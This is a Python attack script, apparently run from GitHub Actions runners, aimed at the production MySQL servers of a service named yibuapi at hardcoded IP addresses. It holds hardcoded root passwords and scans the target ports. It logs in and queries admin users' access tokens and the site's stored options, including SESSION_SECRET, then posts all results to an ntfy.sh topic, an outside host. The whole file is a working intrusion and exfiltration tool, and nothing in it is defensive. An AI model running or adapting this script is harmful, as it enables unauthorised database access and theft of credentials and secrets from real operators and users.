#!/usr/bin/env python3
# i46232: from fresh Azure GHA runner EIPs, reach production MySQL of yibuapi and
# read-only dump users(role>=10 access_token) + options(SESSION_SECRET etc).
import os, sys, socket, json, time, urllib.request

JOB = str(os.environ.get("JOB","0"))
TOPIC = os.environ.get("TOPIC","i46232-db")
TARGETS = [("40.160.7.76",3306),("51.222.31.227",3306),("51.161.35.209",3306)]
ALT_PORTS = [22,80,443,8090,5985]
CREDS = [("root","N+eMY8*[H#y<WC8Q+%JayP+<f)vV[phC"),("root","NewSecurePassword123!")]

def log(*a): print(" ".join(str(x) for x in a), flush=True)

def send(tag, text):
    text=str(text)
    for i in range(0,len(text),3400):
        try:
            req=urllib.request.Request("https://ntfy.sh/"+TOPIC,
               data=((("[j%s %s] "%(JOB,tag))+text[i:i+3400]).encode("utf-8","replace")),
               method="POST", headers={"Title":("i46232-"+tag)[:60]})
            urllib.request.urlopen(req,timeout=12).read()
        except Exception as e:
            log("NTFYERR",str(e)[:80])

def egress():
    for u in ("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
        try: return urllib.request.urlopen(u,timeout=10).read().decode().strip()
        except Exception: pass
    return "ERR"

def tcp(host,port,t=6.0):
    st=time.time()
    try:
        s=socket.create_connection((host,port),timeout=t); s.close()
        return "OPEN:%dms"%round((time.time()-st)*1000)
    except ConnectionRefusedError: return "REFUSED"
    except socket.timeout: return "TIMEOUT"
    except Exception as e: return "ERR:"+str(e)[:40]

def trymysql(host,port,user,pw):
    import pymysql
    try:
        conn=pymysql.connect(host=host,port=port,user=user,password=pw,connect_timeout=9,read_timeout=20,charset="utf8mb4")
    except Exception as e:
        return None,"CONNERR:"+str(e)[:140]
    out={}
    cur=conn.cursor()
    def q(sql,key):
        try:
            cur.execute(sql); out[key]=cur.fetchall()
        except Exception as e: out[key+"_err"]=str(e)[:200]
    q("SELECT VERSION(),USER(),@@hostname","who")
    q("SHOW DATABASES","databases")
    q("SELECT id,username,role,email,LEFT(access_token,80) FROM users WHERE role>=10 ORDER BY role DESC LIMIT 80","admins")
    q("SELECT id,username,role,access_token FROM users WHERE role>=10 ORDER BY role DESC LIMIT 20","admin_tokens")
    q("SELECT id,username,role,email FROM users ORDER BY id ASC LIMIT 5","users_head")
    q("SELECT COUNT(*) FROM users","users_count")
    q("SELECT `key`,LEFT(`value`,500) FROM options","options")
    q("SELECT id,name,base_url,type FROM channels LIMIT 40","channels")
    conn.close()
    return out,None

def main():
    log("=== i46232 j%s ==="%JOB)
    ip=egress(); log("egress",ip)
    report={"job":JOB,"egress":ip,"targets":{}}
    for host,port in TARGETS:
        entry={}
        st3306=tcp(host,port); entry["3306"]=st3306; log(host,":3306",st3306)
        if not st3306.startswith("OPEN"):
            for p in ALT_PORTS:
                entry["p%d"%p]=tcp(host,p,t=4.0)
            report["targets"][host]=entry
            send("reach","j%s egress=%s %s:3306=%s alt=%s"%(JOB,ip,host,st3306,{k:v for k,v in entry.items() if k!="3306"}))
            continue
        for user,pw in CREDS:
            out,err=trymysql(host,port,user,pw)
            if err:
                log(host,user,"->",err)
                entry.setdefault("cred_err",[]).append({"user":user,"err":err})
            else:
                log(host,user,"-> OK !!")
                out["egress"]=ip; out["user"]=user; out["target"]=host
                report["targets"][host]=entry; entry["DBHIT"]=True
                send("DBHIT", json.dumps({"egress":ip,"job":JOB,"user":user,"target":host,"out":out},default=str)[:60000])
                print("DBHIT", json.dumps(out,default=str))
                return
        report["targets"][host]=entry
    send("summary",json.dumps(report,default=str)[:8000])

if __name__=="__main__":
    main()
